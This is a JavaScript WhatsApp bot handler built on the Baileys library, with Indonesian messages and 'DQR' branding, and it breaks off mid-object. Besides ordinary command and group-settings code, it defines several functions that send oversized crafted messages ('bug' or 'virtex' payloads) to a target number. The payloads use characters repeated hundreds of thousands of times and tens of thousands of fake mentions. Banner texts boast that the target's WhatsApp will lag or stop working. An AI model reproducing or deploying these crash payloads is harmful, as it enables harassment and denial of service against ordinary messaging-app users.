require("./setting");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const fs3 = require("fs");
const util2 = require("util");
const chalk2 = require("chalk");
const os2 = require("os");
const axios2 = require("axios");
const pino2 = require("pino");
const fsExtra = require("fs-extra");
const crypto2 = require("crypto");
const fluentFfmpeg = require("fluent-ffmpeg");
const momentTimezone = require("moment-timezone");
const {
  JSDOM
} = require("jsdom");
const awesomePhonenumber = require("awesome-phonenumber");
const {
  color,
  bgcolor
} = require("./lib/color");
const {
  uptotelegra
} = require("./lib/upload");
const {
  Primbon
} = require("scrape-primbon");
const v612 = new Primbon();
const {
  remini
} = require("./database/remini");
const hxzApi = require("hxz-api");
const ytdlCore = require("ytdl-core");
const {
  Configuration,
  OpenAIApi
} = require("openai");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  smsg,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins
} = require("./lib/myfunc");
const {
  FajarNews,
  BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KomikuSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme,
  Cerpen,
  Quotes,
  Couples,
  Darkjokes
} = require("dhn-api");
const {
  isSetBot,
  addSetBot,
  removeSetBot,
  changeSetBot,
  getTextSetBot,
  updateResponList,
  delResponList,
  renameList,
  isAlreadyResponListGroup,
  sendResponList,
  isAlreadyResponList,
  getDataResponList,
  addResponList,
  isSetClose,
  addSetClose,
  removeSetClose,
  changeSetClose,
  getTextSetClose,
  isSetDone,
  addSetDone,
  removeSetDone,
  changeSetDone,
  getTextSetDone,
  isSetLeft,
  addSetLeft,
  removeSetLeft,
  changeSetLeft,
  getTextSetLeft,
  isSetOpen,
  addSetOpen,
  removeSetOpen,
  changeSetOpen,
  getTextSetOpen,
  isSetProses,
  addSetProses,
  removeSetProses,
  changeSetProses,
  getTextSetProses,
  isSetWelcome,
  addSetWelcome,
  removeSetWelcome,
  changeSetWelcome,
  getTextSetWelcome,
  addSewaGroup,
  getSewaExpired,
  getSewaPosition,
  expiredCheck,
  checkSewaGroup,
  addPay,
  updatePay
} = require("./lib/store");
function f14(p145) {
  temp = p145;
  days = Math.floor(p145 / 86400000);
  daysms = p145 % 86400000;
  hours = Math.floor(daysms / 3600000);
  hoursms = p145 % 3600000;
  minutes = Math.floor(hoursms / 60000);
  minutesms = p145 % 60000;
  sec = Math.floor(minutesms / 1000);
  return days + " Days " + hours + " Hours " + minutes + " Minutes";
}
const vF6 = p146 => {
  myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
  myDays = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jum’at", "Sabtu"];
  var v613 = new Date(p146);
  var v614 = v613.getDate();
  bulan = v613.getMonth();
  var v616 = v613.getDay();
  var v616 = myDays[v616];
  var v617 = v613.getYear();
  var v618 = v617 < 1000 ? v617 + 1900 : v617;
  const v619 = momentTimezone.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
  let v620 = new Date();
  let v621 = "id";
  let v622 = new Date(0).getTime() - new Date("1 January 1970").getTime();
  let v623 = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor((v620 * 1 + v622) / 84600000) % 5];
  return v616 + ", " + v614 + " - " + myMonths[bulan] + " - " + v618;
};
module.exports = drayyy = async (p147, p148, p149, p150, p151, p152, p153, p154, p155, p156, p157, p158, p159, p160, p161, p162, p163, p164, p165, p166) => {
  try {
    var v624 = p148.mtype === "conversation" ? p148.message.conversation : p148.mtype == "imageMessage" ? p148.message.imageMessage.caption : p148.mtype == "videoMessage" ? p148.message.videoMessage.caption : p148.mtype == "extendedTextMessage" ? p148.message.extendedTextMessage.text : p148.mtype == "buttonsResponseMessage" ? p148.message.buttonsResponseMessage.selectedButtonId : p148.mtype == "listResponseMessage" ? p148.message.listResponseMessage.singleSelectReply.selectedRowId : p148.mtype == "templateButtonReplyMessage" ? p148.message.templateButtonReplyMessage.selectedId : p148.mtype == "interactiveResponseMessage" ? JSON.parse(p148.msg.nativeFlowResponseMessage.paramsJson).id : p148.mtype == "templateButtonReplyMessage" ? p148.msg.selectedId : p148.mtype === "messageContextInfo" ? p148.message.buttonsResponseMessage?.selectedButtonId || p148.message.listResponseMessage?.singleSelectReply.selectedRowId || p148.text : "";
    var v625 = typeof p148.text == "string" ? p148.text : "";
    const v626 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v624) ? v624.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : "";
    const vF7 = (p167, p168 = 1) => {
      var v627 = "abcdefghijklmnopqrstuvwxyz1234567890".split("");
      var v628 = {
        1: "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890"
      };
      var v629 = [];
      v627.map((p169, p170) => v629.push({
        original: p169,
        convert: v628[p168].split("")[p170]
      }));
      var v630 = p167.toLowerCase().split("");
      var v631 = [];
      v630.map(p171 => {
        const v632 = v629.find(p172 => p147.original == p171);
        if (v632) {
          v631.push(v632.convert);
        } else {
          v631.push(p171);
        }
      });
      return v631.join("");
    };
    const v633 = p148.pushName || "No Name";
    function f15() {
      var v634 = new Date();
      var v635 = v634.getDate();
      var v636 = v634.getMonth() + 1;
      var v637 = v634.getFullYear();
      var v638 = v634.getHours();
      var v639 = v634.getMinutes();
      var v640 = v634.getSeconds();
    }
    const v641 = v624.startsWith(v626);
    const v642 = v641 ? v624.slice(v626.length).trim().split(" ").shift().toLowerCase() : "";
    const v643 = v624.trim().split(/ +/).slice(1);
    const v644 = await p147.decodeJid(p147.user.id);
    const v645 = [v644, ...global.owner].map(p173 => p173.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(p148.sender);
    const v646 = q = v643.join(" ");
    const {
      type: _0x12a531,
      quotedMsg: _0x367a18,
      mentioned: _0x4b5a00,
      now: _0x10a7c6,
      fromMe: _0x2320bf
    } = p148;
    const v647 = p148.quoted ? p148.quoted : p148;
    const v648 = (v647.msg || v647).mimetype || "";
    const v649 = /image|video|sticker|audio/.test(v648);
    const v650 = mek.key.remoteJid;
    const v651 = v650.endsWith("@g.us");
    const v652 = v650.endsWith("@s.whatsapp.net");
    const v653 = p148.isGroup ? p148.key.participant ? p148.key.participant : p148.participant : p148.key.remoteJid;
    const v654 = v653.split("@")[0];
    const v655 = v644.includes(v654);
    const v656 = p148.isGroup ? await p147.groupMetadata(v650).catch(p174 => {}) : "";
    const v657 = p148.isGroup ? v656.subject : "";
    const v658 = p148.isGroup ? await v656.participants : "";
    const v659 = p148.isGroup ? await getGroupAdmins(v658) : "";
    const v660 = p148.isGroup ? v659.includes(v644) : false;
    const v661 = p148.isGroup ? v659.includes(p148.sender) : false;
    const v662 = JSON.parse(fs3.readFileSync("./database/testimoni.json"));
    let v663 = JSON.parse(fs3.readFileSync("./database/set_welcome.json"));
    let v664 = JSON.parse(fs3.readFileSync("./database/set_left.json"));
    let v665 = JSON.parse(fs3.readFileSync("./database/welcome.json"));
    let v666 = JSON.parse(fs3.readFileSync("./database/left.json"));
    let v667 = JSON.parse(fs3.readFileSync("./database/set_proses.json"));
    let v668 = JSON.parse(fs3.readFileSync("./database/set_done.json"));
    let v669 = JSON.parse(fs3.readFileSync("./database/set_open.json"));
    let v670 = JSON.parse(fs3.readFileSync("./database/set_close.json"));
    let v671 = JSON.parse(fs3.readFileSync("./database/sewa.json"));
    let v672 = JSON.parse(fs3.readFileSync("./database/pay.json"));
    let v673 = JSON.parse(fs3.readFileSync("./database/opengc.json"));
    let v674 = JSON.parse(fs3.readFileSync("./database/antilink.json"));
    let v675 = JSON.parse(fs3.readFileSync("./database/antiwame.json"));
    let v676 = JSON.parse(fs3.readFileSync("./database/antilink2.json"));
    let v677 = JSON.parse(fs3.readFileSync("./database/autojpm.json"));
    let v678 = JSON.parse(fs3.readFileSync("./database/antiwame2.json"));
    let v679 = JSON.parse(fs3.readFileSync("./database/list.json"));
    const v680 = JSON.parse(fs3.readFileSync("./database/premium.json"));
    const v681 = JSON.parse(fs3.readFileSync("./database/partner.json"));
    const v682 = JSON.parse(fs3.readFileSync("./database/owner.json"));
    const v683 = JSON.parse(fs3.readFileSync("./database/unli.json"));
    const v684 = fs3.readFileSync("./zeno/draybergoyang.mp3");
    const v685 = JSON.parse(fs3.readFileSync("./database/dray/contacts.json"));
    const v686 = JSON.stringify(p148.message);
    const v687 = JSON.parse(fs3.readFileSync("./database/idgrup.json").toString());
    const v688 = p148.isGroup ? v687.includes(p148.chat) : false;
    const v689 = v646.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const v690 = p148.mtype == "extendedTextMessage" && p148.message.extendedTextMessage.contextInfo != null ? p148.message.extendedTextMessage.contextInfo.mentionedJid : [];
    const v691 = v685.includes(v653);
    const v692 = v665.includes(p148.chat);
    const v693 = v666.includes(p148.chat);
    const v694 = v674.includes(p148.chat) ? true : false;
    const v695 = v676.includes(p148.chat) ? true : false;
    const v696 = v677.includes(p148.chat) ? true : false;
    const v697 = v680.includes(v653);
    const v698 = v681.includes(v653);
    const v699 = v683.includes(p148.chat);
    const v700 = v682.includes(v654) || v655;
    const v701 = _0x12a531 == "extendedTextMessage" && p148.message.extendedTextMessage.contextInfo != null ? p148.message.extendedTextMessage.contextInfo.participant || "" : "";
    const v702 = momentTimezone(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z");
    const v703 = momentTimezone().tz("Asia/Kolkata").format("HH:mm:ss");
    if (v703 < "23:59:00") {
      var vVF76 = vF7("Good Night");
    }
    if (v703 < "19:00:00") {
      var vVF76 = vF7("Good Evening");
    }
    if (v703 < "18:00:00") {
      var vVF76 = vF7("Good Evening");
    }
    if (v703 < "15:00:00") {
      var vVF76 = vF7("Good Afternoon");
    }
    if (v703 < "11:00:00") {
      var vVF76 = vF7("Good Morning");
    }
    if (v703 < "05:00:00") {
      var vVF76 = vF7("Good Morning");
    }
    const v704 = momentTimezone(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
    const v705 = momentTimezone.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const v706 = p148.quoted ? "true" : "false";
    async function f16(p175, p176) {
      fs3.readFile(p175, "utf8", (p177, p178) => {
        if (p177) {
          console.error("Terjadi kesalahan:", p177);
          return;
        }
        const v707 = new RegExp("case\\s+'" + p176 + "':[\\s\\S]*?break", "g");
        const v708 = p178.replace(v707, "");
        fs3.writeFile(p175, v708, "utf8", p179 => {
          if (p179) {
            console.error("Terjadi kesalahan saat menulis file:", p179);
            return;
          }
          console.log("Teks dari case '" + p176 + "' telah dihapus dari file.");
        });
      });
    }
    const vF8 = p180 => {
      if (p180.match("@")) {
        return [...p180.matchAll(/@([0-9]{5,16}|0)/g)].map(p181 => p181[1] + "@s.whatsapp.net");
      } else {
        return [v653];
      }
    };
    const v709 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...(v650 ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        extendedTextMessage: {
          text: v624
        }
      }
    };
    const vF9 = async p182 => p147.sendMessage(p148.chat, {
      text: p182,
      contextInfo: {
        mentionedJid: [v653],
        forwardingScore: 9999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          containsAutoReply: true,
          title: "𝐃𝐐𝐑 𝑵𝒆𝒘 𝑬𝒓𝒂",
          body: "𝐃𝐐𝐑",
          previewType: "PHOTO",
          thumbnailUrl: "youtube.com/@dqrsctean",
          thumbnail: fs3.readFileSync("./zeno/Xynz.jpg"),
          sourceUrl: "https://whatsapp.com/channel/0029Vaj4X9iAInPzUk3v1L"
        }
      }
    }, {
      quoted: p148
    });
    if (!p147.public) {
      if (!p148.key.fromMe) {
        return;
      }
    }
    let v710 = ["recording"];
    let v711 = v710[Math.floor(Math.random() * v710.length)];
    if (p148.message) {
      p147.sendPresenceUpdate("available", p148.chat);
      console.log("[1;31m~[1;37m>", "[[1;32m Dqr [1;37m]", v702, chalk2.blue(v625 || p148.mtype), " 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴▾");
    }
    for (let v712 of v662) {
      if (v625 === v712) {
        let v713 = fs3.readFileSync("./database/dray/" + v712 + ".jpg");
        p147.sendMessage(p148.chat, {
          image: v713
        }, {
          quoted: p148
        });
      }
    }
    const {
      ios: _0xe071f
    } = require("./database/virtex/ios.js");
    const {
      telapreta3: _0x251e7d
    } = require("./database/virtex/telapreta3.js");
    const {
      convite: _0x580066
    } = require("./database/virtex/convite.js");
    const {
      bugpdf: _0xde4be7
    } = require("./database/virtex/bugpdf.js");
    const {
      cP: _0x155b54
    } = require("./database/virtex/bugUrl.js");
    const {
      beta1: _0x2ce83d,
      beta2: _0x413d51,
      buk1: _0x1c309b
    } = require("./database/hdr.js");
    const v714 = "『 𝐃𝐐𝐑 𝐒𝐔𝐂𝐂𝐄𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n❀ 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n❀ 𝐕𝐈𝐑𝐔𝐒  : NULL\n\n    𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug delay, target tidak bisa menggunakan whatsapp untuk menggunakan whatsapp untuk sementara waktu";
    const v715 = "『 𝐃𝐐𝐑 𝐒𝐔𝐂𝐂𝐄𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n❀ 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n❀ 𝐕𝐈𝐑𝐔𝐒  : 𝗧𝗿𝗮𝘀𝗵 𝗨𝗜 𝗦𝘆𝘀𝘁𝗲𝗺\n\n    𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug delay dan virus ui, aplikasi whatsapp target tidak dapat digunakan sementara dikarenakan mengalami lemot, lag dan delay";
    const v716 = "『 𝐃𝐐𝐑 𝐒𝐔𝐂𝐂𝐄𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 』\n\n❀ 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n❀ 𝐕𝐈𝐑𝐔𝐒  : 𝗧𝗿𝗮𝘀𝗵 𝗨𝗜 𝗦𝘆𝘀𝘁𝗲𝗺\n\n    𝐍𝐎𝐓𝐄\n> Target telah menerima virus bug ui system, handphone target akan lag dan ui tidak menanggapi saat membuka aplikasi whatsapp";
    const v717 = p148.mtype === "extendedTextMessage" && v686.includes("viewOnceMessage");
    const vF10 = p183 => {
      return p147.sendMessage(p148.chat, {
        react: {
          text: p183,
          key: p148.key
        }
      });
    };
    async function f17(p184) {
      let v718 = "⿻ 🔗⃟𝐃𝐐𝐑 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴▾ ༑̴⟆̊⿻ ";
      await p147.relayMessage(p184, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐃𝐐𝐑 𝐈𝐬 𝐇𝐞𝐫𝐞" + "@null@@null@null".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "D̸̢̮̫̰̥̗̘̱͉͙͙̺̫̏͒̅̌ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️â̸̙͐͑̌̿͛̽y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: p184
        }
      }, {
        messageId: null
      });
    }
    const v719 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝o̶̯͎̱̱̱̱̱̱̱̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓dq⨀o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓p̸̢̻͓͎̻͙͂͒̋͒̓̃͊̐̔͘͝",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["27746135260@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    async function f18(p185) {
      let v720 = "main ml kuy" + "@null@whatsapp ".repeat(50000);
      let v721 = Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      let v722 = {
        groupMentionedMessage: {
          message: {
            listResponseMessage: {
              title: " @120363326274964194@g.us",
              listType: "SINGLE_SELECT",
              singleSelectReply: {
                selectedRowId: "Gateway To Hell"
              },
              description: " @120363326274964194@g.us",
              contextInfo: {
                mentionedJid: v721,
                groupMentions: [{
                  groupJid: "120363326274964194@g.us",
                  groupSubject: v720
                }]
              }
            }
          }
        }
      };
      await p147.relayMessage(p185, v722, {
        participant: {
          jid: p185
        }
      }, {
        messageId: null
      });
    }
    async function f19(p186) {
      await p147.relayMessage(p186, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "ิ҈࿆ۣ𝐃𝐐𝐑 𝑪𝑹𝑨𝑺𝑯" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " Xintrashboy "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: p186
        }
      }, {
        messageId: null
      });
    }
    async function f20(p187, p188 = false) {
      await p147.relayMessage(p187, {
        extendedTextMessage: {
          text: "🗿ิ҈࿆ۣ𝐃𝐐𝐑 𝑪𝑹𝑨𝑺𝑯" + "ଁଁଁଁଁଁଁଁଁଁଁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୣୣୣୢୢୢୢୢૢૣଁଁଁ".repeat(45000),
          contextInfo: {
            mentionedJid: ["6282146497469@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "6282146497469@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: false,
                callOutcome: "5",
                durationSecs: "999",
                callType: "REGULAR",
                participants: [{
                  jid: "6282146497469@s.whatsapp.net",
                  callOutcome: "5"
                }]
              }
            },
            remoteJid: p187,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 10,
            isForwarded: false,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: fs3.readFileSync("./zeno/anjay.jpg"),
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
              body: "Bug ui by © dqr",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "x",
              mediaUrl: "x",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "‎ ‎ "
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, p188 ? {
        participant: {
          jid: p187
        }
      } : {});
      console.log(chalk2.red("DQR SEND BUG"));
    }
    ;
    p147.sendButtonVideo = async (p189, p190, p191, p192 = {}) => {
      var v723 = await prepareWAMessageMedia({
        video: {
          url: p192 && p192.video ? p192.video : ""
        }
      }, {
        upload: p147.waUploadToServer
      });
      let vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p189, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: p192 && p192.body ? p192.body : ""
              },
              footer: {
                text: p192 && p192.footer ? p192.footer : ""
              },
              header: {
                hasMediaAttachment: true,
                videoMessage: v723.videoMessage
              },
              nativeFlowMessage: {
                buttons: p190,
                messageParamsJson: ""
              },
              contextInfo: {
                externalAdReply: {
                  title: global.namabot,
                  body: "𝐃𝐐𝐑 𝐍𝐞𝐰 𝐄𝐫𝐚",
                  thumbnailUrl: global.imageurl,
                  sourceUrl: global.isLink,
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      }, {
        quoted: p191
      });
      await p147.sendPresenceUpdate("composing", p189);
      return p147.relayMessage(p189, vGenerateWAMessageFromContent7.message, {
        messageId: vGenerateWAMessageFromContent7.key.id
      });
    };
    async function f21(p193, p194, p195, p196, p197, p198, p199, p200) {
      var vGenerateWAMessageFromContent8 = generateWAMessageFromContent(p193, proto.Message.fromObject({
        qp: {
          filter: {
            filterName: p194,
            parameters: p195,
            filterResult: p196,
            clientNotSupportedConfig: p197
          },
          filterClause: {
            clauseType: p198,
            clauses: p199,
            filters: p200
          }
        }
      }), {
        userJid: p193
      });
      await p147.relayMessage(p193, vGenerateWAMessageFromContent8.message, {
        participant: {
          jid: p193
        },
        messageId: vGenerateWAMessageFromContent8.key.id
      });
    }
    async function f22(p201, p202, p203, p204, p205, p206, p207, p208, p209, p210, p211, p212, p213, p214) {
      var vGenerateWAMessageFromContent9 = generateWAMessageFromContent(p201, proto.Message.fromObject({
        sessionStructure: {
          sessionVersion: p202,
          localIdentityPublic: p203,
          remoteIdentityPublic: p204,
          rootKey: p205,
          previousCounter: p206,
          senderChain: p207,
          receiverChains: p208,
          pendingKeyExchange: p209,
          pendingPreKey: p210,
          remoteRegistrationId: p211,
          localRegistrationId: p212,
          needsRefresh: p213,
          aliceBaseKey: p214
        }
      }), {
        userJid: p201
      });
      await p147.relayMessage(p201, vGenerateWAMessageFromContent9.message, {
        participant: {
          jid: p201
        },
        messageId: vGenerateWAMessageFromContent9.key.id
      });
    }
    async function f23(p215, p216) {
      let v724 = await generateWAMessageFromContent(p215, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "kontol"
              },
              header: {
                hasMediaAttachment: false,
                locationMessage: {}
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p215,
        quoted: p216
      });
    }
    const v725 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
